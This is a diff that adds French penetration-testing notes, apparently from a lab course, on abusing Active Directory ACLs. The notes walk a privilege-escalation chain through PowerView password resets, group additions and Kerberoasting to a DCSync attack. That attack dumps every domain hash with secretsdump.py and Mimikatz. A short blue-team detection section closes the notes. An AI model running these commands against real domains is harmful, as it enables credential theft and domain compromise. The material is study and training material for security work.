@@ -1074,5 +1074,360 @@ Lancer Hashcat selon le type de hash trouvé.
 
 ---
 
+# Abuse des Access Control Lists (ACL) – Active Directory
+
+## Définition et types
+
+- Une **Access Control List (ACL)** définit quels utilisateurs/groupes ont accès à quel objet, et le niveau de droit associé.
+- Les ACL sont constituées d’**Access Control Entries (ACE)** : chaque ACE précise les droits d’un utilisateur, d’un groupe ou d’un process (security principal).
+- **Deux types principaux d’ACLs** :
+    - `DACL` (Discretionary Access Control List) : détermine qui a/qui n’a pas accès à un objet. Si absence de DACL, tout le monde a accès. Si DACL sans ACE, accès refusé à tous.
+    - `SACL` (System Access Control List) : permet de journaliser les tentatives d’accès (audit).
+
+## Composants d’un ACE
+
+- **SID** du principal autorisé
+- Type : `Access allowed`, `Access denied`, ou `System audit`
+- Héritage vers enfants/objets descendants
+- Masque de droits (32 bits)
+
+## Types principaux d’ACE
+
+| Type ACE              | Utilisation                                   |
+|-----------------------|-----------------------------------------------|
+| Access denied ACE     | Refus explicite d’un accès via DACL           |
+| Access allowed ACE    | Autorisation explicite d’un accès via DACL    |
+| System audit ACE      | Génération d’audit via SACL                   |
+
+## Pourquoi c’est important
+
+- Les permissions cachées par des ACE mal configurées offrent des opportunités d’attaque : **lateral movement**, **escalade de privilèges**, **persistence**.
+- Ces entrées sont difficiles à repérer par scan automatisé.
+- Outils comme `BloodHound` et `PowerView` permettent de les cartographier et de détecter les chemins d’attaque.
+
+## Exemples d’abus classiques
+
+| Permission                | Commande d’abus typique (PowerView, etc.)           |
+|---------------------------|-----------------------------------------------------|
+| `ForceChangePassword`     | `Set-DomainUserPassword`                            |
+| `Add Members`             | `Add-DomainGroupMember`                             |
+| `GenericAll`              | `Set-DomainUserPassword`, `Add-DomainGroupMember`   |
+| `GenericWrite`            | `Set-DomainObject`                                  |
+| `WriteOwner`              | `Set-DomainObjectOwner`                             |
+| `WriteDACL`               | `Add-DomainObjectACL`                               |
+| `AllExtendedRights`       | `Set-DomainUserPassword`, `Add-DomainGroupMember`   |
+| `Addself`                 | `Add-DomainGroupMember`                             |
+
+## Focus sur :
+
+- **ForceChangePassword** : reset du mot de passe d’un utilisateur (sans connaître l’ancien)
+- **GenericWrite** : modification de tout attribut non protégé (ex: ajouter un SPN, Kerberoasting, ajout à un groupe, délégation…)
+- **AddSelf** : possibilité d’ajouter le principal dans des groupes
+- **GenericAll** : contrôle total sur l’objet cible (reset pass, ajout groupe, dump LAPS, etc.)
+
+## Méthodologie d’attaque
+
+- **Énumération des droits/ACE** :
+    - `BloodHound` : ingestion via `SharpHound.exe` ou `BloodHound.py`
+    - `PowerView` :  
+        - `Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs`
+        - `Find-InterestingDomainAcl`
+        - `Find-InterestingAce`
+    - Outils AD natifs : ADUC (clic-droit > propriétés > sécurité > avancé)
+
+- **Exploitation** :
+    - Utiliser la commande/outil d’abus selon le droit découvert (voir tableau ci-dessus)
+    - **Exemple** :  
+        - Ajout à un groupe privilégié :  
+          `Add-DomainGroupMember -Identity "Domain Admins" -Members <User>`
+        - Reset mot de passe utilisateur (force change) :  
+          `Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString "NouveauPassword" -AsPlainText -Force) -Verbose`
+        - Ajout d’ACE (persistence) :  
+          `Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <attacker> -Rights All`
+
+- **Nettoyage** :
+    - Revert les changements après exploitation
+    - Documenter toute modification
+
+## Scénarios d’attaque fréquents
+
+| Scénario                     | Description                                                  |
+|------------------------------|-------------------------------------------------------------|
+| Abus reset password          | Utilisation des droits de helpdesk pour reset un compte VIP |
+| Abus gestion de groupe       | Ajout dans un groupe privilégié                             |
+| Droits excessifs (héritage)  | Utilisateur hérite de droits après install/config logiciel  |
+
+## Conseils
+
+- Toujours valider les actions destructives avec le client.
+- Documenter précisément toutes les actions sur l’AD.
+- Se familiariser avec les **edges** BloodHound et les droits étendus AD.
+- Surveiller et auditer les modifications d’ACL (logs).
+
+---
+
+# Énumération des ACLs – Active Directory
+
+## Outils principaux
+
+- **PowerView** (module PowerShell)
+- **BloodHound** (`SharpHound` pour l’ingestion)
+- Cmdlets PowerShell natifs : `Get-Acl`, `Get-ADUser`, `Get-ADObject`, etc.
+
+---
+
+## 1. Énumération ciblée avec PowerView
+
+- Lister les ACEs “intéressants” (peu lisible, gros volume de données) :
+    ```powershell
+    Find-InterestingDomainAcl
+    ```
+
+- **Enumérer les droits d’un utilisateur précis** :
+    1. Importer PowerView :
+        ```powershell
+        Import-Module .\PowerView.ps1
+        ```
+    2. Récupérer le SID de la cible :
+        ```powershell
+        $sid = Convert-NameToSid <user>
+        ```
+    3. Rechercher les objets sur lesquels cet utilisateur a des droits :
+        ```powershell
+        Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+        ```
+    4. Pour résultats lisibles, résoudre les GUIDs :
+        ```powershell
+        Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+        ```
+
+    - **Astuce** : Utiliser le flag `-ResolveGUIDs` permet d’obtenir le nom du droit plutôt que le GUID non lisible (ex : `User-Force-Change-Password` au lieu de `00299570-...`).
+
+## 2. Conversion GUID <-> droit humain
+
+- Pour mapper un GUID vers son nom :
+    ```powershell
+    $guid= "<GUID>"
+    Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
+      -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |
+      ?{$_.rightsGuid -eq $guid} | select Name,DisplayName
+    ```
+
+## 3. Méthode native PowerShell (sans PowerView)
+
+- Générer la liste des utilisateurs du domaine :
+    ```powershell
+    Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+    ```
+- Boucler sur chaque utilisateur pour extraire les droits d’un principal cible :
+    ```powershell
+    foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {
+        get-acl "AD:\$(Get-ADUser $line)" |
+        Select-Object Path -ExpandProperty Access |
+        Where-Object {$_.IdentityReference -match 'DOMAINE\\<user>'}
+    }
+    ```
+
+## 4. Scénario de chaîne d’escalade via ACEs
+
+Exemple d’enchaînement réel :
+
+- **Contrôle sur `wley`** (accès initial)
+    - Possibilité de *ForceChangePassword* sur `damundsen` (`User-Force-Change-Password`)
+- **Contrôle sur `damundsen`**
+    - Possibilité d’ajouter des membres dans le groupe `Help Desk Level 1` (`GenericWrite`)
+- **`Help Desk Level 1`** est membre du groupe `Information Technology` (nested group)
+- **`Information Technology`** a `GenericAll` sur l’utilisateur `adunn`
+    - Possibilité de reset pass, modifier l’objet, Kerberoasting, etc.
+- **`adunn`** possède les droits :  
+    - `DS-Replication-Get-Changes`
+    - `DS-Replication-Get-Changes-In-Filtered-Set`
+    - => Permet une attaque `DCSync` (dump de tous les secrets AD)
+
+## 5. Énumération graphique avec BloodHound
+
+- **Ingestion** : collecte via `SharpHound`, import du zip dans BloodHound.
+- **Recherche visuelle** :
+    - Sélectionner le compte de départ (ex: `wley`)
+    - Onglet `Node Info` > `Outbound Control Rights` : voir sur quels objets il y a un contrôle direct, transitif, via group nesting, etc.
+    - Cliquer sur les liens : menu contextuel > `Help` pour :
+        - Guides d’abus du droit (outils, commandes)
+        - Références externes, OpSec
+    - Requêtes pré-définies : chercher les droits DCSync (`GetChanges`, `GetChangesAll`) pour trouver les comptes à privilège très élevé.
+
+## Points clefs & conseils
+
+- Privilégier l’énumération **ciblée** sur un user/groupe qu’on contrôle : énorme gain de temps par rapport à une extraction “full AD”.
+- Vérifier l’**héritage des groupes** (nested groups) : permet de remonter à des droits inattendus.
+- Utiliser BloodHound pour confirmer rapidement des chaînes d’escalade ou de pivot.
+- Toujours convertir les GUID en droits humains pour analyser la faisabilité d’un abus.
+- Bien connaître le mapping des droits pour identifier une possible escalade ou persistence (ForceChangePassword, GenericWrite, GenericAll, DCSync, etc.)
+
+> Pour automatiser la chasse, utiliser PowerView pour l’extraction, BloodHound pour la visualisation, puis enchaîner les commandes d’abus selon les droits trouvés.  
+
+---
+
+# Abuse des ACLs AD – Escalade de Privilèges & Compromission
+
+Exploiter les ACLs dans Active Directory, de l’énumération à la compromission du domaine via une chaîne d’attaque (exemple : `wley` ➔ `damundsen` ➔ Help Desk Level 1 ➔ Information Technology ➔ `adunn` ➔ DCSync).
+
+## 1. Prendre la main sur le premier user (ex : `wley`)
+Récupéré le mot de passe ou hash NTLM cracké
+
+## 2. Changer le mot de passe d’un autre user via ForceChangePassword
+
+Créer un credential PowerShell pour `wley` :  
+
+`$SecPassword = ConvertTo-SecureString '<PASSWORD_WLEY>' -AsPlainText -Force ; $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
+
+Créer un SecureString avec le nouveau mot de passe pour `damundsen` :  
+
+`$TargetPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
+
+Changer le mot de passe de `damundsen` :  
+
+`Set-DomainUserPassword -Identity damundsen -AccountPassword $TargetPassword -Credential $Cred -Verbose`
+
+## 3. Ajouter `damundsen` dans un groupe privilégié (ex : Help Desk Level 1) avec GenericWrite
+
+Se connecter avec le mot de passe de `damundsen` :  
+
+`$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force ; $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)`
+
+Ajouter `damundsen` dans le groupe Help Desk Level 1 :  
+
+`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
+
+## 4. Vérifier l’imbrication de groupes et escalader
+
+Voir à quel groupe appartient Help Desk Level 1 :  
+
+`Get-DomainGroup -Identity "Help Desk Level 1" | select memberof`
+
+Vérifier les droits du groupe Information Technology : 
+
+`$sidIT = Convert-NameToSid "Information Technology"`  
+`Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sidIT}`
+
+## 5. Prendre le contrôle de `adunn` via GenericAll
+
+Créer un faux SPN pour Kerberoasting (en tant que membre Information Technology) : 
+
+`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
+
+Récupérer le hash Kerberos avec Rubeus :  
+
+`.\Rubeus.exe kerberoast /user:adunn /nowrap`
+
+(Ensuite, cracker le hash offline avec Hashcat.)
+
+## 6. (Optionnel) DCSync Attack si le compte le permet
+
+(Exemple d’utilisation d’Impacket ou secretsdump si on a les droits de réplication.)
+
+## 7. Nettoyage post-exploitation
+
+Supprimer le faux SPN de `adunn` :  
+
+`Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`
+
+Retirer `damundsen` du groupe Help Desk Level 1 :  
+
+`Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`
+
+Remettre le mot de passe d’origine de `damundsen` (si connu) : 
+
+`Set-DomainUserPassword -Identity damundsen -AccountPassword $AncienMotDePasse -Credential $Cred -Verbose`
+
+## 8. Monitoring & détection côté blue team
+
+- Auditer régulièrement les ACLs avec BloodHound, supprimer les droits abusifs.
+- Surveiller l’ajout/retrait de membres dans les groupes sensibles.
+- Activer l’audit avancé (Event ID 5136).
+- Décoder une SDDL avec :
+- 
+  `ConvertFrom-SddlString "<SDDL_HERE>" | select -ExpandProperty DiscretionaryAcl`
+
+---
+
+# DCSync Attack – Extraction des Hashs AD via Replication Rights
+
+Cette section récapitule le déroulé d’une attaque DCSync permettant d’obtenir les NTLM hash de tous les comptes du domaine, en s’appuyant sur un compte possédant les droits de réplication (DS-Replication-Get-Changes et DS-Replication-Get-Changes-All).
+
+## 1. Vérification des droits de réplication
+
+Récupérer le SID du compte cible (`adunn`) :  
+
+`Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl`
+
+Vérifier la présence des droits de réplication sur l’objet domaine :  
+
+`$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"`  
+`Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get') } | ? { $_.SecurityIdentifier -match $sid } | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl`
+
+## 2. Extraction des hash AD avec secretsdump.py (Linux)
+
+Utiliser Impacket pour exécuter la réplication et extraire les hashs :  
+
+`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`
+
+Pour extraire uniquement les hash NTLM d’un utilisateur :  
+
+`secretsdump.py -just-dc-user <USERNAME> INLANEFREIGHT/adunn@172.16.5.5`
+
+Afficher les fichiers générés :  
+
+`ls inlanefreight_hashes*`
+
+Afficher les mots de passe en clair (si présents) :  
+
+`cat inlanefreight_hashes.ntds.cleartext`
+
+Options complémentaires :  
+
+- `-just-dc-ntlm` : n’extrait que les NTLM hash  
+- `-pwd-last-set` : affiche la date de dernier changement de mot de passe  
+- `-history` : extrait l’historique des mots de passe  
+- `-user-status` : statut actif/désactivé des comptes
+
+## 3. Extraction des hash AD avec Mimikatz (Windows)
+
+Lancer une console PowerShell en tant qu’utilisateur ayant les droits de réplication :  
+
+`runas /netonly /user:INLANEFREIGHT\adunn powershell`
+
+Dans la nouvelle session :  
+
+`.\mimikatz.exe`
+
+Dans Mimikatz :  
+
+`privilege::debug`  
+`lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`
+
+## 4. Recherche des comptes avec stockage réversible des mots de passe
+
+Lister les comptes ayant l’option "mot de passe stocké de façon réversible" :  
+
+`Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`
+
+Avec PowerView :  
+
+`Get-DomainUser -Identity * | ? { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } | select samaccountname,useraccountcontrol`
+
+Afficher les mots de passe en clair extraits (si disponibles) :  
+
+`cat inlanefreight_hashes.ntds.cleartext`
+
+## 5. Points clés
+
+- Toute entité possédant les droits DS-Replication-Get-Changes et DS-Replication-Get-Changes-All peut exécuter DCSync et extraire tous les hashs du domaine.
+- L’attaque peut être menée avec secretsdump.py (Linux/Windows), Mimikatz (Windows), ou tout outil capable d’abuser de la réplication AD.
+- Des comptes non administrateurs peuvent parfois disposer de ces droits (erreur de configuration).
+- Les mots de passe stockés avec chiffrement réversible peuvent être récupérés en clair.
+- Un audit régulier des ACLs et des droits de réplication est essentiel pour limiter ce risque.
+
+---
+
 
 
